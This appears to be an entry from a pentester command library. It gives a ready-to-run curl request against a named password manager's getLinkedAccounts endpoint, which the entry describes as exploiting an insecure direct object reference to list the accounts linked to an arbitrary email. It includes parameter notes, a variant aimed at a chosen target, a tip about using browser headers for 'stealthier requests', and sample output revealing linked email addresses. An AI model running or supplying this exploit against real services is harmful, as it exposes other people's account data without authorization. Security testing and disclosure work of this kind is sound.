---
id: cmd-curl-dashlane-idor
data: >-
  curl -X POST 'https://www.dashlane.com/1/account/getLinkedAccounts' -H
  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101
  Firefox/47.0' -H 'Content-Type: application/x-www-form-urlencoded;
  charset=UTF-8' -H 'Referer: https://www.dashlane.com/business/try' -b
  'your_session_cookies_here' -d 'email=pentester.owasp@gmail.com'
tags:
  - http-request
  - api-test
type: command
output: >-
  {"code":200,"message":"OK","content":{"logins":["pentester.owasp@gmail.com","arbaz.owasp@gmail.com","hacker.arbaz@gmail.com"]}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.684Z'
verified: false
validated: true
submitted: true
---
# curl-post-getlinkedaccounts

## Command

```bash
curl -X POST 'https://www.dashlane.com/1/account/getLinkedAccounts' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://www.dashlane.com/business/try' \
  -b 'your_session_cookies_here' \
  -d 'email=pentester.owasp@gmail.com'
```

## Description

This command sends a POST request to Dashlane's getLinkedAccounts endpoint to exploit IDOR by querying linked emails for an arbitrary address. Use it in authenticated sessions to test access controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H 'User-Agent: ...'` | Mimics browser user agent | Yes |
| `-H 'Content-Type: ...'` | Sets form-urlencoded encoding | Yes |
| `-H 'Referer: ...'` | Provides referring URL | Yes |
| `-b 'cookies'` | Includes session cookies | Yes |
| `-d 'email=...'` | Target email parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.dashlane.com/1/account/getLinkedAccounts' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=abc123' -d 'email=target@example.com'
```

### Advanced Usage

Include full headers as shown in the main command for stealthier requests.

## Expected Output

JSON response with code 200 and a "logins" array of associated emails, e.g., {"code":200,"message":"OK","content":{"logins":["email1","email2"]}}.

## Related

- [[Related Procedure|procedures/Send-IDOR-POST-to-GetLinkedAccounts]]
